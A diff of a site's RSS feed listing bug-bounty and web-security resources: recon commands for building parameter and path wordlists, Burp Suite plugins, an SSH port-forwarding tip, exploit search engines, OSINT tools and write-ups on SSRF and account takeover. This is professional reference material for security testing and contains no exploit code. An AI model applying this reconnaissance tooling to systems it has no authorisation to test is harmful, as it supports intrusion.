-      <description>Wordlist generation #  After spidering across the target it is a good idea to check the content discovered and append the newly discovered content to your wordlist.
-Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys | anew all_parameters.txt Paths #  cat links.txt | unfurl paths | rev | cut -d &#39;/&#39; -f1 | rev | anew paths.txt </description>
+      <description> Wordlist generation # After spidering across the target it is a good idea to check the content discovered and append the newly discovered content to your wordlist.
+Parameters # # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys | anew all_parameters.txt Paths # cat links.txt | unfurl paths | rev | cut -d &amp;#39;/&amp;#39; -f1 | rev | anew paths.txt </description>
     </item>
     
     <item>
@@ -614,7 +645,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/burp/</guid>
-      <description>Burp Suite #  Plugins #   Backslash powered scanner, find additional vulns JS Miner, gets sensitive content from js files Active Scan++, find additional vulns J2EEScan JS Link Finder, find links inside javascript files Para Miner, mines urls searching for parameters Reflector, find reflected inputs JSON Web Tokens, creates a tab to analyze json based tokens Retire.js, find old javascript libraries with known vulns Web Cache Deception Scanner, tests for cache problems Burp Bounty, OP HTTP methods discloser, discloses methods for same endpoint  Tips n Tricks #  Send traffic from VPS to local burp #  # Run this in terminal connecting to vps (if ssh with key is possible) # When in WSL, portforwarding needs to be set ssh -R 8080:127.</description>
+      <description>Burp Suite # Plugins # Backslash powered scanner, find additional vulns JS Miner, gets sensitive content from js files Active Scan++, find additional vulns J2EEScan JS Link Finder, find links inside javascript files Para Miner, mines urls searching for parameters Reflector, find reflected inputs JSON Web Tokens, creates a tab to analyze json based tokens Retire.js, find old javascript libraries with known vulns Web Cache Deception Scanner, tests for cache problems Burp Bounty, OP HTTP methods discloser, discloses methods for same endpoint Tips n Tricks # Send traffic from VPS to local burp # # Run this in terminal connecting to vps (if ssh with key is possible) # When in WSL, portforwarding needs to be set ssh -R 8080:127.</description>
     </item>
     
     <item>
@@ -623,7 +654,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/career/</guid>
-      <description>Career Advice #     Site Description     https://github.com/rezaduty/cybersecurity-career-path/blob/master/Security_Engineer(Software).md CyberSec career path   https://devskiller.com/screen-security-engineer/ Security Engineer Career   https://hbr.org/1999/11/management-time-whos-got-the-monkey Aout management time       Articles     https://hbr.org/1999/11/management-time-whos-got-the-monkey    </description>
+      <description> Career Advice # Site Description https://github.com/rezaduty/cybersecurity-career-path/blob/master/Security_Engineer(Software).md CyberSec career path https://devskiller.com/screen-security-engineer/ Security Engineer Career https://hbr.org/1999/11/management-time-whos-got-the-monkey Aout management time Articles https://hbr.org/1999/11/management-time-whos-got-the-monkey </description>
     </item>
     
     <item>
@@ -632,7 +663,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/regexes/</guid>
-      <description>Regexes #  Subdomain level extraction #     Regex pattern Domain level match    </description>
+      <description> Regexes # Subdomain level extraction # Regex pattern Domain level match </description>
     </item>
     
     <item>
@@ -641,7 +672,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/repositories/</guid>
-      <description>Respositories #     Repository Description     https://github.com/Lissy93/personal-security-checklist#authentication Security Checklist from explanatory side    </description>
+      <description> Respositories # Repository Description https://github.com/Lissy93/personal-security-checklist#authentication Security Checklist from explanatory side </description>
     </item>
     
     <item>
@@ -650,7 +681,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/sites/</guid>
-      <description>Sites #     Link Niche     https://www.hahwul.com/ Blog   https://netsec.expert/ Blog   https://ihorrasch.com/ Blog   https://www.agarri.fr/en Blog   https://www.100security.com.br/ Blog (portuguese)   https://www.hacking8.com/ Blog (chinese)   https://www.rcesecurity.com Blog   https://weboas.is/ Link aggregator   https://portswigger.net/research Burp&amp;rsquo;s owner research blog   https://blog.orange.tw/ Blog/Research   https://swarm.ptsecurity.com/ PT Swarm research blog   https://0xdf.gitlab.io/ Solving HTB machines   https://sploitus.</description>
+      <description> Sites # Link Niche https://www.hahwul.com/ Blog https://netsec.expert/ Blog https://ihorrasch.com/ Blog https://www.agarri.fr/en Blog https://www.100security.com.br/ Blog (portuguese) https://www.hacking8.com/ Blog (chinese) https://www.rcesecurity.com Blog https://weboas.is/ Link aggregator https://portswigger.net/research Burp&amp;rsquo;s owner research blog https://blog.orange.tw/ Blog/Research https://swarm.ptsecurity.com/ PT Swarm research blog https://0xdf.gitlab.io/ Solving HTB machines https://sploitus.com/ Search engine to find exploits https://www.exploitalert.com/ Search engine to find exploits https://unsafe.sh Chinese forum https://secret.club/ About HW and low level hacking </description>
     </item>
     
     <item>
@@ -659,7 +690,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/tools/</guid>
-      <description>Web Tools #     Website Description     https://osintframework.com/ Collecion of OSINT tools   https://grep.app/ Grep over multiple github repositories   https://publicwww.com/ Grep over multiple websites source codes   https://www.degraeve.com/reference/urlencoding.php List of URL encoded characters   https://api-guesser.netlify.app/ Input an api key and the script will return from where it belongs   https://gchq.github.io/CyberChef/ For all purposes   https://securityheaders.com/ Test sites for security headers   https://builtwith.</description>
+      <description> Web Tools # Website Description https://osintframework.com/ Collecion of OSINT tools https://grep.app/ Grep over multiple github repositories https://publicwww.com/ Grep over multiple websites source codes https://www.degraeve.com/reference/urlencoding.php List of URL encoded characters https://api-guesser.netlify.app/ Input an api key and the script will return from where it belongs https://gchq.github.io/CyberChef/ For all purposes https://securityheaders.com/ Test sites for security headers https://builtwith.com Database of sites technologies </description>
     </item>
     
     <item>
@@ -668,7 +699,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/writeups/</guid>
-      <description>Write Ups #     WriteUp Description     https://pentester.land/list-of-bug-bounty-writeups.html List of up to date writeups   https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/ Common vulns often missed   http://www.pc-help.org/obscure.htm Obscure URLs, useful for SSRF   https://ctftime.org/writeups?tags=web200&amp;hidden-tags=web%2cweb100%2cweb200 CTF writeups   https://sensepost.com/blog/2021/android-application-testing-using-windows-11-and-windows-subsystem-for-android/ Android testing in windows 11   https://www.xmind.net/m/2FwJ7D/ Cookie based authentication issues   https://hbothra22.medium.com/attacking-social-logins-pre-authentication-account-takeover-790248cfdc3 Pre-Takeover using social logins   https://gowthams.gitbook.io/bughunter-handbook/intresting-vulnerabilities/payment-bypasses Payment Flow Vulnerabilites    </description>
+      <description> Write Ups # WriteUp Description https://pentester.land/list-of-bug-bounty-writeups.html List of up to date writeups https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/ Common vulns often missed http://www.pc-help.org/obscure.htm Obscure URLs, useful for SSRF https://ctftime.org/writeups?tags=web200&amp;hidden-tags=web%2cweb100%2cweb200 CTF writeups https://sensepost.com/blog/2021/android-application-testing-using-windows-11-and-windows-subsystem-for-android/ Android testing in windows 11 https://www.xmind.net/m/2FwJ7D/ Cookie based authentication issues https://hbothra22.medium.com/attacking-social-logins-pre-authentication-account-takeover-790248cfdc3 Pre-Takeover using social logins https://gowthams.gitbook.io/bughunter-handbook/intresting-vulnerabilities/payment-bypasses Payment Flow Vulnerabilites </description>
     </item>
     
     <item>
@@ -677,7 +708,7 @@ Parameters #  # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/resources/youtubechannels/</guid>
-      <description>Youtube Channels #     Name Channel     Ippsec https://www.youtube.com/c/ippsec   Reconless https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ    </description>
+      <description> Youtube Channels # Name Channel Ippsec https://www.youtube.com/c/ippsec Reconless https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ </description>
     </item>
     
   </channel>
